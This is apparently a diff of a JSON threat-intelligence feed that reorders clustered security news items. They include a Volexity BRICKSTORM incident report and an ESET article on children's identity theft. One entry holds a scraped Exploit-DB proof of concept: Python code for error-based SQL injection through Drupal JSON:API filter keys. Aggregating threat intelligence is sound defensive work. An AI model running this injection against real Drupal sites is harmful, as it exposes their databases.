-          "cohort": "threat_research_primary",
-          "title": "VerdantBamboo: Just Another BRICKSTORM in the Firewall",
-          "link": "https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/",
-          "published": "2026-06-04T20:23:55+00:00",
-          "summary": "In September 2025, Volexity conducted an incident response engagement that began after suspicious network traffic was observed from a Linux-based virtual machine appliance on a customer’s network. The virtual machine […] The post VerdantBamboo: Just Another BRICKSTORM in the Firewall appeared first on Volexity .",
-          "taxonomy": {
-            "threat_categories": [
-              "web_shell_backdoor"
-            ],
-            "actor_attribution": [
-              "UNC5221"
-            ],
-            "affected_industries": [],
-            "affected_products": [
-              "Microsoft 365",
-              "Google Cloud"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Microsoft 365": "target",
-              "Google Cloud": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "68573a4922",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure",
-          "education",
-          "financial_services"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "ESET WeLiveSecurity",
-        "cohort": "threat_research_primary",
-        "title": "Lessons for life: Why children’s data is a long-term identity risk",
-        "link": "https://www.welivesecurity.com/en/kids-online/lessons-life-childrens-data-long-term-identity-risk/",
-        "published": "2026-06-03T08:50:00+00:00",
-        "summary": "Your child’s first data breach may happen before they’ve even opened a bank account. Here’s how to keep their digital life safe.",
-        "full_body": "Kids Online Lessons for life: Why children’s data is a long-term identity risk Your child’s first data breach may happen before they’ve even opened a bank account. Here’s how to keep their digital life safe. Phil Muncaster 03 Jun 2026 • , 6 min. read When we talk about cybersecurity and digital safety in the context of our children, it’s often framed in one of two ways. Either it’s about inappropriate or unsafe content – of the sort that COPPA is meant to regulate in the US. Or it’s about managing the psychological and social impacts of excessive screen time. But there’s an elephant in the room. Our kids are exposed to many of the same identity, privacy, and data security risks as their parents. In fact they may be even more at risk. Helping them understand how to protect their data and online accounts at an early age is an increasingly important parental responsibility. Why do people want my kids’ data? Our children are digital natives. From an early age they might have logins to school accounts, gaming profiles , cloud photos, health records, and accounts with a variety of other apps. All of these contain potentially lucrative data for identity thieves . Why is this information a popular target? Because from a fraud perspective it has a relatively long shelf life. That means, if it’s stolen and used by a scammer to open a new line of credit, it’s unlikely the victim would find out, until perhaps they apply for their first loan many years later. What’s more, it will have a pristine credit score, meaning the fraudulent application will likely sail through unchecked. Fraudsters might use it as is, or combine it with made-up information to create synthetic identities. The emergence of AI tools has made it far easier to spin up these fake identities. They might be harder for companies to spot. But when they do finally flag fraud, the impact on your child’s credit history can be severe. These are not theoretical risks. One report reveals the story of risk and compliance professional Renata Galvão, whose identity was stolen at the age of six and used to run up debt in excess of $400,000. It reportedly took her over two decades to clear her name and restore her credit rating. In another case, Axton Betz-Hamilton was 11 when her identity was stolen and used to rack up thousands of dollars in unpaid credit card bills. She only found out when applying to set up her first utility bill at college. Current data is hard to come by, but the FTC claims that child identity theft increased by 40% between 2021 and 2024. What could go wrong? Children’s data is at risk in other ways. Kids might be digitally savvy enough to set up online accounts, but they’re not always security-smart. They may be more prone to fall for a phishing message; especially if it appears to be sent from a trusted authority or friend . Too-good-to-be-true offers, innocuous-looking quizzes and FOMO-type ads are all more likely to hit home if the target is a credulous 13-year-old rather than a skeptical adult. Kids are also more likely to unwittingly download malware onto their devices or share their passwords and personal info with their peers, compounding security risk. Roblox gamers sharing their experiences after downloading fake versions of Solara. Source: YouTube But it’s not just our children who represent a potential weak link in the security chain. Research from the University of Southampton last year found that nearly half (45%) of parents regularly share information about their children online. Sharenting like this increases the risk of it falling into the hands of fraudsters. Around one-in-six children have already experienced at least one form of digital harm, including cyberbullying , privacy breaches, or identity misuse, the study claimed. There’s also a growing risk that the edtech vendors, school platforms, gaming providers, smart toy makers, social media companies and other firms entrusted with your child’s data are themselves breached. The non-profit Iden",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "critical_infrastructure",
-            "education"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "ESET WeLiveSecurity",
-          "cohort": "threat_research_primary",
-          "title": "Lessons for life: Why children’s data is a long-term identity risk",
-          "link": "https://www.welivesecurity.com/en/kids-online/lessons-life-childrens-data-long-term-identity-risk/",
-          "published": "2026-06-03T08:50:00+00:00",
-          "summary": "Your child’s first data breach may happen before they’ve even opened a bank account. Here’s how to keep their digital life safe.",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "critical_infrastructure",
-              "education"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "1f5463ba47",
       "priority_score": 10,
       "member_count": 1,
@@ -5827,60 +5657,62 @@
       ]
     },
     {
-      "cluster_id": "98f46bf0a9",
+      "cluster_id": "68573a4922",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
-      "strong_signals": [
-        "Drupal"
-      ],
+      "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng"
+        ],
         "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Drupal"
+        "affected_industries": [
+          "critical_infrastructure",
+          "education",
+          "financial_services"
         ],
+        "affected_products": [],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-9082"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
           "news_report"
         ],
         "confidence_tier": [
-          "tier_1_offensive_research"
+          "tier_1_primary_research"
         ]
       },
       "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[webapps] Drupal Core 10.5.5 - Error-Based SQL Injection",
-        "link": "https://www.exploit-db.com/exploits/52608",
-        "published": "2026-06-01T00:00:00+00:00",
-        "summary": "Drupal Core 10.5.5 - Error-Based SQL Injection",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Drupal Core 10.5.5 - Error-Based SQL Injection EDB-ID: 52608 CVE: 2026-9082 EDB Verified: Author: cardosource Type: webapps Exploit: / Platform: PHP Date: 2026-06-01 Vulnerable App: # Exploit Title: Drupal Core 10.5.5 - Error-Based SQL Injection # Google Dork: N/A # Date: 2026-05-31 # Exploit Author: cardosource # Vendor Homepage: https://www.drupal.org # Software Link: https://www.drupal.org/project/drupal # Version: Drupal Core 10.5.5 # Tested on: Debian Linux (Docker), PHP 8.2, Apache, PostgreSQL 17 # CVE: CVE-2026-9082 # # Description: # This proof-of-concept demonstrates an Error-Based SQL Injection in # Drupal Core 10.5.5 (PostgreSQL). User-controlled JSON:API filter # array keys influence SQL query construction, allowing database # information disclosure through SQL error messages. import requests import json from urllib.parse import urlencode TARGET_URL = \"http://localhost:8080/jsonapi/node/article\" BANNER = \"\"\" [+] Drupal Core 10.5.5 - Error-Based SQL Injection [+] CVE-2026-9082 [+] Target: JSON:API (PostgreSQL) \"\"\" def extract_data(subquery): headers = { \"Accept\": \"application/vnd.api+json\", \"Content-Type\": \"application/vnd.api+json\" } payload = f\"0||CAST(({subquery}) AS INTEGER)\" params = { \"filter[my_filter][condition][path]\": \"title\", \"filter[my_filter][condition][operator]\": \"IN\", \"filter[my_filter][condition][value][0]\": \"Example\", f\"filter[my_filter][condition][value][{payload}]\": \"Injection\" } try: response = requests.get(TARGET_URL, headers=headers, params=params, timeout=10) if response.status_code == 500: try: error = response.json().get(\"errors\", [{}])[0].get(\"detail\", \"\") if \"invalid input syntax\" in error: data = error.split('\"')[1] if '\"' in error else error print(f\"\\033[92m[SUCCESS]\\033[0m {data}\") except json.JSONDecodeError: pass except requests.exceptions.RequestException: pass if __name__ == \"__main__\": print(BANNER) extract_data(\"SELECT version()\") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "source": "ESET WeLiveSecurity",
+        "cohort": "threat_research_primary",
+        "title": "Lessons for life: Why children’s data is a long-term identity risk",
+        "link": "https://www.welivesecurity.com/en/kids-online/lessons-life-childrens-data-long-term-identity-risk/",
+        "published": "2026-06-03T08:50:00+00:00",
+        "summary": "Your child’s first data breach may happen before they’ve even opened a bank account. Here’s how to keep their digital life safe.",
+        "full_body": "Kids Online Lessons for life: Why children’s data is a long-term identity risk Your child’s first data breach may happen before they’ve even opened a bank account. Here’s how to keep their digital life safe. Phil Muncaster 03 Jun 2026 • , 6 min. read When we talk about cybersecurity and digital safety in the context of our children, it’s often framed in one of two ways. Either it’s about inappropriate or unsafe content – of the sort that COPPA is meant to regulate in the US. Or it’s about managing the psychological and social impacts of excessive screen time. But there’s an elephant in the room. Our kids are exposed to many of the same identity, privacy, and data security risks as their parents. In fact they may be even more at risk. Helping them understand how to protect their data and online accounts at an early age is an increasingly important parental responsibility. Why do people want my kids’ data? Our children are digital natives. From an early age they might have logins to school accounts, gaming profiles , cloud photos, health records, and accounts with a variety of other apps. All of these contain potentially lucrative data for identity thieves . Why is this information a popular target? Because from a fraud perspective it has a relatively long shelf life. That means, if it’s stolen and used by a scammer to open a new line of credit, it’s unlikely the victim would find out, until perhaps they apply for their first loan many years later. What’s more, it will have a pristine credit score, meaning the fraudulent application will likely sail through unchecked. Fraudsters might use it as is, or combine it with made-up information to create synthetic identities. The emergence of AI tools has made it far easier to spin up these fake identities. They might be harder for companies to spot. But when they do finally flag fraud, the impact on your child’s credit history can be severe. These are not theoretical risks. One report reveals the story of risk and compliance professional Renata Galvão, whose identity was stolen at the age of six and used to run up debt in excess of $400,000. It reportedly took her over two decades to clear her name and restore her credit rating. In another case, Axton Betz-Hamilton was 11 when her identity was stolen and used to rack up thousands of dollars in unpaid credit card bills. She only found out when applying to set up her first utility bill at college. Current data is hard to come by, but the FTC claims that child identity theft increased by 40% between 2021 and 2024. What could go wrong? Children’s data is at risk in other ways. Kids might be digitally savvy enough to set up online accounts, but they’re not always security-smart. They may be more prone to fall for a phishing message; especially if it appears to be sent from a trusted authority or friend . Too-good-to-be-true offers, innocuous-looking quizzes and FOMO-type ads are all more likely to hit home if the target is a credulous 13-year-old rather than a skeptical adult. Kids are also more likely to unwittingly download malware onto their devices or share their passwords and personal info with their peers, compounding security risk. Roblox gamers sharing their experiences after downloading fake versions of Solara. Source: YouTube But it’s not just our children who represent a potential weak link in the security chain. Research from the University of Southampton last year found that nearly half (45%) of parents regularly share information about their children online. Sharenting like this increases the risk of it falling into the hands of fraudsters. Around one-in-six children have already experienced at least one form of digital harm, including cyberbullying , privacy breaches, or identity misuse, the study claimed. There’s also a growing risk that the edtech vendors, school platforms, gaming providers, smart toy makers, social media companies and other firms entrusted with your child’s data are themselves breached. The non-profit Iden",
         "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "phishing_social_eng",
+            "data_breach"
+          ],
           "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Drupal"
+          "affected_industries": [
+            "financial_services",
+            "critical_infrastructure",
+            "education"
           ],
+          "affected_products": [],
           "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-9082"
-          ],
+          "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "Drupal": "target"
-          },
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -5888,30 +5720,31 @@
       },
       "corroborating_sources": [
         {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[webapps] Drupal Core 10.5.5 - Error-Based SQL Injection",
-          "link": "https://www.exploit-db.com/exploits/52608",
-          "published": "2026-06-01T00:00:00+00:00",
-          "summary": "Drupal Core 10.5.5 - Error-Based SQL Injection",
+          "source": "ESET WeLiveSecurity",
+          "cohort": "threat_research_primary",
+          "title": "Lessons for life: Why children’s data is a long-term identity risk",
+          "link": "https://www.welivesecurity.com/en/kids-online/lessons-life-childrens-data-long-term-identity-risk/",
+          "published": "2026-06-03T08:50:00+00:00",
+          "summary": "Your child’s first data breach may happen before they’ve even opened a bank account. Here’s how to keep their digital life safe.",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "phishing_social_eng",
+              "data_breach"
+            ],
             "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Drupal"
+            "affected_industries": [
+              "financial_services",
+              "critical_infrastructure",
+              "education"
             ],
+            "affected_products": [],
             "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-9082"
-            ],
+            "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "Drupal": "target"
-            },
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -6008,6 +5841,201 @@
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
             "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "15d2915b57",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "web_shell_backdoor"
+        ],
+        "actor_attribution": [
+          "UNC5221"
+        ],
+        "affected_industries": [],
+        "affected_products": [
+          "Google Cloud",
+          "Microsoft 365"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Volexity",
+        "cohort": "threat_research_primary",
+        "title": "VerdantBamboo: Just Another BRICKSTORM in the Firewall",
+        "link": "https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/",
+        "published": "2026-06-04T20:23:55+00:00",
+        "summary": "In September 2025, Volexity conducted an incident response engagement that began after suspicious network traffic was observed from a Linux-based virtual machine appliance on a customer’s network. The virtual machine […] The post VerdantBamboo: Just Another BRICKSTORM in the Firewall appeared first on Volexity .",
+        "full_body": "Threat Intelligence VerdantBamboo: Just Another BRICKSTORM in the Firewall June 4, 2026 Damien Cash, Paul Rascagneres, Steven Adair, and Tom Lancaster In September 2025, Volexity conducted an incident response engagement that began after suspicious network traffic was observed from a Linux-based virtual machine appliance on a customer’s network. The virtual machine was an Egnyte Storage Sync system, which is designed to facilitate syncing local on-premise files with the cloud. Volexity discovered that instead of connecting to a domain affiliated with Egnyte, the appliance was connecting to a threat-actor-controlled domain behind Cloudflare IP addresses. The appliance was also making TLS connections to one of Google’s public DNS servers ( 8.8.8.8 ). It appeared to be using Google to perform queries via DNS over HTTPS, as there was no DNS activity for the domain observed in the connections. Later in the investigation, this was confirmed to be the case after Volexity obtained snapshots of the Storage Sync system for analysis. Ultimately, Volexity’s analysis revealed that a Chinese threat actor, which Volexity tracks as VerdantBamboo (WARP PANDA, UNC5221), had compromised the Storage Sync system. The suspicious connections observed were the result of a malware implant known as BRICKSTORM (described in public reporting, including posts by CISA , Google Cloud and NVISO ). Volexity’s analysis also revealed that the appliance had periodically been accessed by VerdantBamboo via IP addresses assigned through the victim organization’s web SSL VPN. The initial findings determined that the threat actor used the malware’s proxying capabilities deployed on the Storage Sync system, along with compromised credentials, to access the victim’s Microsoft 365 (M365) environment. Volexity assesses with high confidence that this was done to blend in with legitimate network traffic and evade Conditional Access policies that would have otherwise prevented access. Further investigation uncovered a much longer timeline: the initial compromise had actually occurred at least 18 months earlier. After Volexity completed the initial remediation effort, VerdantBamboo returned to once again breach the victim organization by connecting with stolen administrative credentials to the victim’s firewall. VerdantBamboo used that access to enable and configure web SSL VPN access to that device. That access was then used to further connect to systems internally and deploy additional custom malware to a Synology NAS appliance. During the course of the investigation, Volexity determined that VerdantBamboo had compromised the victim organization’s Managed Services Provider (MSP). Working closely with the MSP, Volexity found suspect traffic emanating from the MSP’s network as well. After a brief investigation of the MSP’s network, Volexity found that the MSP’s pfSense firewall had been compromised by VerdantBamboo with a BSD variant of BRICKSTORM. Volexity concluded that this firewall, like the victim organization’s Storage Sync system, had also been compromised at least 18 months earlier. Volexity assesses with medium confidence that the victim organization had been compromised by way of VerdantBamboo’s breach of the MSP. Forensic investigation of the Storage Sync system and the pfSense firewall resulted in the discovery of multiple samples of the BRICKSTORM backdoor. Volexity would later find a BRICKSTORM sample on the victim organization’s network on a virtual machine that had been retired. This sample was installed on a legacy Linux-based GroupWise server used for archived email messages, which had since been fully shutdown but was still accessible for the investigation. While BRICKSTORM was the primary implant used by VerdantBamboo, Volexity identified two previously undocumented (at the time of discovery) malware families: PLENET , a malware family written in .NET Core and compiled to native code using the Native AOT features added in .NET 7. The analyzed sample was w",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "web_shell_backdoor"
+          ],
+          "actor_attribution": [
+            "UNC5221"
+          ],
+          "affected_industries": [],
+          "affected_products": [
+            "Microsoft 365",
+            "Google Cloud"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Microsoft 365": "target",
+            "Google Cloud": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Volexity",
+          "cohort": "threat_research_primary",
+          "title": "VerdantBamboo: Just Another BRICKSTORM in the Firewall",
+          "link": "https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/",
+          "published": "2026-06-04T20:23:55+00:00",
+          "summary": "In September 2025, Volexity conducted an incident response engagement that began after suspicious network traffic was observed from a Linux-based virtual machine appliance on a customer’s network. The virtual machine […] The post VerdantBamboo: Just Another BRICKSTORM in the Firewall appeared first on Volexity .",
+          "taxonomy": {
+            "threat_categories": [
+              "web_shell_backdoor"
+            ],
+            "actor_attribution": [
+              "UNC5221"
+            ],
+            "affected_industries": [],
+            "affected_products": [
+              "Microsoft 365",
+              "Google Cloud"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Microsoft 365": "target",
+              "Google Cloud": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "98f46bf0a9",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "Drupal"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Drupal"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-9082"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Exploit-DB",
+        "cohort": "offensive_vulnerability_research",
+        "title": "[webapps] Drupal Core 10.5.5 - Error-Based SQL Injection",
+        "link": "https://www.exploit-db.com/exploits/52608",
+        "published": "2026-06-01T00:00:00+00:00",
+        "summary": "Drupal Core 10.5.5 - Error-Based SQL Injection",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Drupal Core 10.5.5 - Error-Based SQL Injection EDB-ID: 52608 CVE: 2026-9082 EDB Verified: Author: cardosource Type: webapps Exploit: / Platform: PHP Date: 2026-06-01 Vulnerable App: # Exploit Title: Drupal Core 10.5.5 - Error-Based SQL Injection # Google Dork: N/A # Date: 2026-05-31 # Exploit Author: cardosource # Vendor Homepage: https://www.drupal.org # Software Link: https://www.drupal.org/project/drupal # Version: Drupal Core 10.5.5 # Tested on: Debian Linux (Docker), PHP 8.2, Apache, PostgreSQL 17 # CVE: CVE-2026-9082 # # Description: # This proof-of-concept demonstrates an Error-Based SQL Injection in # Drupal Core 10.5.5 (PostgreSQL). User-controlled JSON:API filter # array keys influence SQL query construction, allowing database # information disclosure through SQL error messages. import requests import json from urllib.parse import urlencode TARGET_URL = \"http://localhost:8080/jsonapi/node/article\" BANNER = \"\"\" [+] Drupal Core 10.5.5 - Error-Based SQL Injection [+] CVE-2026-9082 [+] Target: JSON:API (PostgreSQL) \"\"\" def extract_data(subquery): headers = { \"Accept\": \"application/vnd.api+json\", \"Content-Type\": \"application/vnd.api+json\" } payload = f\"0||CAST(({subquery}) AS INTEGER)\" params = { \"filter[my_filter][condition][path]\": \"title\", \"filter[my_filter][condition][operator]\": \"IN\", \"filter[my_filter][condition][value][0]\": \"Example\", f\"filter[my_filter][condition][value][{payload}]\": \"Injection\" } try: response = requests.get(TARGET_URL, headers=headers, params=params, timeout=10) if response.status_code == 500: try: error = response.json().get(\"errors\", [{}])[0].get(\"detail\", \"\") if \"invalid input syntax\" in error: data = error.split('\"')[1] if '\"' in error else error print(f\"\\033[92m[SUCCESS]\\033[0m {data}\") except json.JSONDecodeError: pass except requests.exceptions.RequestException: pass if __name__ == \"__main__\": print(BANNER) extract_data(\"SELECT version()\") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Drupal"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-9082"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {
+            "Drupal": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Exploit-DB",
+          "cohort": "offensive_vulnerability_research",
+          "title": "[webapps] Drupal Core 10.5.5 - Error-Based SQL Injection",
+          "link": "https://www.exploit-db.com/exploits/52608",
+          "published": "2026-06-01T00:00:00+00:00",
+          "summary": "Drupal Core 10.5.5 - Error-Based SQL Injection",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Drupal"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-9082"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {
+              "Drupal": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -7599,8 +7627,8 @@
     {
       "cluster_id": "5e1681c391",
       "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
+      "member_count": 3,
+      "corroborating_source_count": 2,
       "strong_signals": [
         "Microsoft 365",
         "UNC5221"
@@ -7608,6 +7636,7 @@
       "taxonomy": {
         "threat_categories": [
           "apt_espionage",
+          "phishing_social_eng",
           "web_shell_backdoor",
           "zero_day"
         ],
@@ -7620,7 +7649,9 @@
           "legal_professional"
         ],
         "affected_products": [
+          "AWS",
           "Microsoft 365",
+          "Okta",
           "VMware"
         ],
         "tools_used": [],
@@ -7717,6 +7748,34 @@
             "role_map": {
               "Microsoft 365": "target",
               "VMware": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Coding Gaffe Exposes Microsoft 365 Accounts to Widespread Takeover",
+          "link": "https://www.darkreading.com/application-security/coding-gaffe-exposes-microsoft-365-accounts-takeover",
+          "published": "2026-06-03T19:00:41+00:00",
+          "summary": "A disabled security setting meant to protect authentication across Android versions of key apps like Word, PowerPoint, and Excel paved the way for attackers to steal logins and data.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Microsoft 365"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Microsoft 365": "target"
             },
             "weak_tags": {
               "products": []
@@ -7999,103 +8058,15 @@
       ]
     },
     {
-      "cluster_id": "bb5fa910dd",
-      "priority_score": 8,
-      "member_count": 2,
-      "corroborating_source_count": 1,
-      "strong_signals": [
-        "OpenAI/ChatGPT"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "OpenAI/ChatGPT"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report",
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Infosecurity Europe: Mythos Outperforms GPT5.5 on Google Chrome Vulnerability Exploits, Says New Benchmark",
-        "link": "https://www.infosecurity-magazine.com/news/mythos-gpt-chrome-exploits/",
-        "published": "2026-06-04T13:00:00+00:00",
-        "summary": "A Bugcrowd researcher has unveiled ExploitBench, an independent benchmark of AI models for vulnerability exploitation",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "OpenAI/ChatGPT"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "OpenAI/ChatGPT": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Infosecurity Europe: Mythos Outperforms GPT5.5 on Google Chrome Vulnerability Exploits, Says New Benchmark",
-          "link": "https://www.infosecurity-magazine.com/news/mythos-gpt-chrome-exploits/",
-          "published": "2026-06-04T13:00:00+00:00",
-          "summary": "A Bugcrowd researcher has unveiled ExploitBench, an independent benchmark of AI models for vulnerability exploitation",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "OpenAI/ChatGPT"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "OpenAI/ChatGPT": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "8f36ac3451",
+      "cluster_id": "1f35b1cc5b",
       "priority_score": 8,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "phishing_social_eng"
+        ],
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [],
@@ -8104,23 +8075,25 @@
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
-          "vulnerability_disclosure"
+          "incident_report"
         ],
         "confidence_tier": [
           "tier_4_news"
         ]
       },
       "primary": {
-        "source": "Infosecurity Magazine",
+        "source": "Dark Reading",
         "cohort": "cyber_news_breach_reporting",
-        "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
